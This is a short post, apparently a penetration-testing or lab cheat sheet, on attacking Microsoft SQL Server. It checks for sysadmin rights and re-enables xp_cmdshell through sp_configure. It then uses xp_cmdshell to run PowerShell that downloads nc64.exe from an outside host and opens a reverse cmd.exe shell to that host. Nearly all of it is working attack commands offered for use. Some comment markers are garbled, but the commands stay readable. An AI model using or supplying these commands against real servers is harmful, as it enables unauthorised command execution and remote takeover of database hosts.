# Post

```
SELECT is_srvrolemember('sysadmin'); #if 1 than admin

#prep cmd shell
EXEC xp_cmdshell 'net user'; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell
first as it’s disabled by default:
EXEC sp_configure 'show advanced options', 1; — priv
RECONFIGURE; — priv
EXEC sp_configure 'xp_cmdshell', 1; — priv
RECONFIGURE; — priv

#spawn shell
EXEC xp_cmdshell 'net user';

#activate xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; - Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;


```

```
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.16.15:9999/nc64.exe -outfile nc64.exe"
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.16.15 9999"
```
